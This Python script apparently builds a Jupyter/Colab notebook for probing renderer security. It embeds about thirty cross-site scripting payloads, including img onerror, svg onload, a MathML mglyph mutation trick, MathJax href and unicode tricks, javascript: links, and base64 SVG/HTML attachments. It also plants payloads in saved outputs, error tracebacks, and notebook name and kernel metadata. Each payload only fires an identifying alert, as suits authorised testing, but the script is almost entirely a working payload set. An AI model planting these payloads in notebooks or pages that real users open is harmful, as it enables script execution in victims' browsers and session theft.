"""Throwaway: build a rendering-test notebook. Each payload calls alert('P<n>:'+document.domain) so the
firing payload and its origin are identifiable."""
import json, base64

def A(n):
    return f"alert('P{n}:'+document.domain)"

md = [
    f"P1 img onerror <img src=x onerror=\"{A(1)}\">",
    f"P2 svg onload <svg onload=\"{A(2)}\"></svg>",
    f"P3 script tag <script>{A(3)}</script>",
    f"P4 iframe srcdoc <iframe srcdoc=\"<script>parent.{A(4)}</script>\"></iframe>",
    f"P5 details ontoggle <details open ontoggle=\"{A(5)}\"><summary>x</summary></details>",
    f"P6 mathml mglyph <math><mtext><table><mglyph><style><img src=x onerror=\"{A(6)}\"></style></mglyph></table></mtext></math>",
    "P7 mathjax href $$\\href{javascript:" + A(7) + "}{\\text{P7 click}}$$",
    f"P8 mathjax raw html $$\\unicode{{<img src=x onerror={A(8)}>}}$$",
    f"P9 markdown link [P9 click](javascript:{A(9)})",
    f"P10 style/form <form><button formaction=\"javascript:{A(10)}\">P10 click</button></form>",
    f"P11 attachment svg ![svg](attachment:p11.svg)",
    f"P12 attachment html <img src=\"attachment:p12.html\"> [p12](attachment:p12.html)",
    f"P13 object data <object data=\"data:text/html,<script>{A(13)}</script>\"></object>",
    f"P14 input autofocus <input autofocus onfocus=\"{A(14)}\">",
]
svg = f"<svg xmlns='http://www.w3.org/2000/svg' onload=\"{A(11)}\"><script>{A(11)}</script></svg>"
html = f"<script>{A(12)}</script>"

cells = []
for i, m in enumerate(md):
    c = {"cell_type": "markdown", "metadata": {"id": f"md{i}"}, "source": [m]}
    if m.startswith("P11"):
        c["attachments"] = {"p11.svg": {"image/svg+xml": base64.b64encode(svg.encode()).decode()}}
    if m.startswith("P12"):
        c["attachments"] = {"p12.html": {"text/html": base64.b64encode(html.encode()).decode()}}
    cells.append(c)

outputs = [
    {"output_type": "display_data", "metadata": {}, "data": {"text/html": [f"P20 html output <img src=x onerror=\"{A(20)}\">"], "text/plain": ["P20"]}},
    {"output_type": "display_data", "metadata": {}, "data": {"application/javascript": [A(21)], "text/plain": ["P21"]}},
    {"output_type": "display_data", "metadata": {}, "data": {"image/svg+xml": [f"<svg xmlns='http://www.w3.org/2000/svg' onload=\"{A(22)}\"></svg>"], "text/plain": ["P22"]}},
    {"output_type": "display_data", "metadata": {}, "data": {"text/markdown": [f"P23 md output <img src=x onerror=\"{A(23)}\">"], "text/plain": ["P23"]}},
    {"output_type": "error", "ename": f"<img src=x onerror=\"{A(24)}\">", "evalue": f"<svg onload=\"{A(25)}\">", "traceback": [f"\u001b[31m<img src=x onerror=\"{A(26)}\">\u001b[0m"]},
    {"output_type": "stream", "name": "stdout", "text": [f"P27 stream <img src=x onerror=\"{A(27)}\">"]},
]
cells.append({"cell_type": "code", "execution_count": 1, "metadata": {"id": "code0"}, "source": ["print('P20-27 saved outputs')"], "outputs": outputs})

nb = {
    "nbformat": 4, "nbformat_minor": 0,
    "metadata": {"colab": {"name": f"<img src=x onerror=\"{A(30)}\">", "provenance": []},
                 "kernelspec": {"name": "python3", "display_name": f"<svg onload=\"{A(31)}\">"}},
    "cells": cells,
}
json.dump(nb, open("/tmp/gcpmap/nbtest/render_test.ipynb", "w"), indent=1)
print(len(cells), "cells")
